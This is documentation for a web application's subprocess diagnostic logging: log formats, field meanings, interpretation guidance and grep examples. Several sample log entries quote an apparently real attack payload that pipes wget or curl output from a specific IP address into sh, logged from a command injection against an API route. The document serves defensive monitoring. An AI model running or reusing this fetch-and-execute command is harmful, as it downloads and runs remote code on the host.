# Subprocess Diagnostic Logging - Format & Interpretation

## Overview

The subprocess diagnostic system monitors all subprocess executions (`exec`, `execSync`, `execFile`, `spawn`, `spawnSync`) and logs them with structured, security-aware output. This document describes the log format, fields, and how to interpret them.

## Log Format

### Production Mode (Default)

Logs are emitted in compact `key=value` format for easy grepping:

```
[SUBPROC_DIAG] event=subprocess_attempt severity=INFO executed=true blocked=false logged=true reason=logged method=execSync payload_hash=abc123def456 payload_preview="(wget -qO- http://178.16.52.253/1utig" repeat_count=1 req_method=POST req_path=/api/episodes/new-draft req_cf_ip=192.0.2.1 user_id=123 user_role=admin source_file=route.ts
```

### Debug Mode (`DEBUG_SUBPROC_DIAG=true`)

Logs are emitted as pretty-printed JSON with full payload and stack traces:

```json
{
  "event": "subprocess_attempt",
  "severity": "WARN",
  "executed": true,
  "blocked": false,
  "logged": true,
  "reason": "logged",
  "timestamp": "2025-12-13T16:06:11.270Z",
  "method": "execSync",
  "cmd_allowlisted_name": null,
  "argv_redacted": ["arg1", "arg2"],
  "payload_hash": "abc123def456",
  "payload_preview": "(wget -qO- http://178.16.52.253/1utig",
  "payload_full": "(wget -qO- http://178.16.52.253/1utig||curl -s http://178.16.52.253/1utig)|sh",
  "repeat_count": 5,
  "repeat_window_seconds": 60,
  "request": {
    "method": "POST",
    "path": "/api/episodes/new-draft",
    "query_keys_only": ["id", "format"],
    "cf_ip": "192.0.2.1",
    "user_agent_hash": "hash:120:Mozilla/5.0",
    "request_id": "abc-123-def"
  },
  "user": {
    "id": "123",
    "email": "user@example.com",
    "role": "admin"
  },
  "source": {
    "file": "route.ts",
    "function": "POST"
  },
  "stack": "at POST (/app/src/app/api/episodes/new-draft/route.ts:45:12) | at ..."
}
```

## Event Types

| Event | Description | executed | blocked | logged | Severity |
|-------|-------------|----------|---------|--------|----------|
| `subprocess_exec_ok` | Allowlisted command executed successfully | true | false | true | INFO |
| `subprocess_attempt` | Non-allowlisted command executed | true | false | true | INFO (WARN if repeated ≥5x) |
| `subprocess_exec_fail` | Command execution failed | true | false | true | ERROR |
| `subprocess_log_suppressed` | Logging suppressed (rate-limited), command still executes | true | false | false | INFO (WARN if repeated ≥5x) |
| `subprocess_blocked` | Command execution prevented (future: not currently used) | false | true | true | ERROR |

## Field Descriptions

### Core Fields

- **`event`**: Event type (see above)
- **`severity`**: Log level (`INFO`, `WARN`, `ERROR`)
- **`executed`**: `true` if command was executed (or attempted), `false` if execution was prevented
- **`blocked`**: `true` if execution was prevented, `false` otherwise (currently always `false` - execution is never blocked)
- **`logged`**: `true` if this event was logged, `false` if logging was suppressed (rate-limited)
- **`reason`**: Why the event was logged (`allowlisted`, `logged`, `log_suppressed`, `execution_failed`)
- **`timestamp`**: ISO 8601 timestamp
- **`method`**: Subprocess method (`exec`, `execSync`, `execFile`, `spawn`, `spawnSync`)

### Command Fields

- **`cmd_allowlisted_name`**: Base command name if allowlisted (e.g., `git`, `ffprobe`), `undefined` otherwise
- **`argv_redacted`**: Command arguments with secrets redacted (only for `execFile`/`spawn`)
- **`payload_hash`**: SHA256 hash (first 16 chars) of the full command string
- **`payload_preview`**: First 40 characters of redacted command (safe for logs)
- **`payload_full`**: Full redacted command (only in DEBUG mode)

### Repeat Detection

- **`repeat_count`**: Number of times this exact command was seen in the current window
- **`repeat_window_seconds`**: Window size for repeat counting (default: 60 seconds)

### Request Context

- **`request.method`**: HTTP method (`GET`, `POST`, etc.)
- **`request.path`**: Request path (e.g., `/api/episodes/new-draft`)
- **`request.query_keys_only`**: Query parameter keys only (values redacted for privacy)
- **`request.cf_ip`**: Cloudflare client IP (preferred)
- **`request.xff`**: X-Forwarded-For IP (fallback if no CF-Connecting-IP)
- **`request.user_agent_hash`**: User-Agent hash (privacy-preserving)
- **`request.request_id`**: Request ID from `X-Request-ID` or `CF-Ray` header

### User Context

- **`user.id`**: User ID (if authenticated)
- **`user.email`**: User email (if authenticated)
- **`user.role`**: User role (if authenticated)

### Source Context

- **`source.file`**: Source file name (e.g., `route.ts`)
- **`source.function`**: Function name (e.g., `POST`)
- **`stack`**: Full stack trace (only in DEBUG mode)

## Security & Privacy

### Redaction

The following are automatically redacted from logs:
- Authorization headers (`Authorization: ***`)
- API keys (`Api-Key ***`)
- Bearer tokens (`Bearer ***`)
- Passwords (`password=***`, `PGPASSWORD=***`)
- Cookies (`Cookie: ***`)
- Query parameter values (only keys logged)
- User-Agent (hashed, not full string)

### Secrets Never Logged

- Full request bodies
- Cookie values
- Authorization header values
- Query parameter values (keys only)

## Interpreting Logs

### Normal Operations

```
[SUBPROC_DIAG] event=subprocess_exec_ok severity=INFO executed=true blocked=false reason=allowlisted method=execFile cmd_allowlisted_name=git payload_hash=abc123 req_method=GET req_path=/api/schedule/deterministic
```

This is a normal, allowlisted command (e.g., `git config`) - no action needed.

### Suspicious Activity

```
[SUBPROC_DIAG] event=subprocess_attempt severity=WARN executed=true blocked=false reason=logged method=execSync payload_hash=def456 payload_preview="(wget -qO- http://178.16.52.253/1utig" repeat_count=5 req_method=POST req_path=/api/episodes/new-draft req_cf_ip=192.0.2.1
```

This is a suspicious command (not allowlisted) that has been repeated 5+ times:
- **Action**: Investigate the request path and client IP
- **Check**: Review the endpoint code for command injection vulnerabilities
- **Block**: Consider blocking the client IP if confirmed malicious

### Log Suppression (Rate-Limited)

```
[SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false reason=log_suppressed method=execSync payload_hash=def456 repeat_count=2
```

This command was executed but logging was suppressed (rate-limited):
- **Meaning**: Command still executed (`executed=true`), but logging was suppressed (`logged=false`) to prevent log spam
- **Action**: Check previous log entry for this `payload_hash` to see the full context
- **Note**: `blocked=false` means execution was NOT prevented, only logging was suppressed

## Grepping Examples

### Find all execution-blocked attempts (currently none, but structure supports it)
```bash
docker logs payload-payload-1 | grep "blocked=true"
```

### Find all log-suppressed events
```bash
docker logs payload-payload-1 | grep "logged=false"
```

### Find suspicious commands (non-allowlisted)
```bash
docker logs payload-payload-1 | grep "event=subprocess_attempt"
```

### Find repeated suspicious commands
```bash
docker logs payload-payload-1 | grep "repeat_count=[5-9]"
```

### Find commands from specific IP
```bash
docker logs payload-payload-1 | grep "req_cf_ip=192.0.2.1"
```

### Find commands from specific user
```bash
docker logs payload-payload-1 | grep "user_id=123"
```

### Find commands in specific endpoint
```bash
docker logs payload-payload-1 | grep "req_path=/api/episodes/new-draft"
```

## Environment Variables

- **`DISABLE_SUBPROC_DIAG=true`**: Disable subprocess monitoring entirely
- **`DEBUG_SUBPROC_DIAG=true`**: Enable debug mode (JSON logs, full payloads, stack traces)

## Rate Limiting

Commands are rate-limited for logging purposes only:
- Same command signature logged at most once per second
- Commands still execute normally (rate limiting only affects logging)
- Prevents log spam and stack overflow from malicious loops

## Allowlisted Commands

The following commands are considered safe and logged with `event=subprocess_exec_ok`:
- `git`
- `ffprobe`
- `ffmpeg`
- `psql`
- `rsync`
- `docker`
- `node`
- `npm`
- `npx`

## Troubleshooting

### No request context in logs

If `req_*` fields are missing, the middleware may not be running or failed. Check:
1. `src/middleware.ts` exists and is properly configured
2. Middleware matcher includes your route paths
3. Request is not a static file (excluded by matcher)
4. Middleware is running in Node.js runtime (not Edge runtime - AsyncLocalStorage requires Node.js)
5. Middleware errors are caught gracefully (check for middleware errors in logs)

**Note**: Middleware has graceful fallback - if context capture fails, requests still proceed (just without request context in logs).

### User context missing

User context is only available if:
1. Route handler calls `enrichContextWithUser()` after authentication
2. User is authenticated via Payload auth
3. Request context is available (middleware running)

### Stack traces missing

Stack traces are only included in DEBUG mode (`DEBUG_SUBPROC_DIAG=true`). Enable debug mode for detailed stack traces.

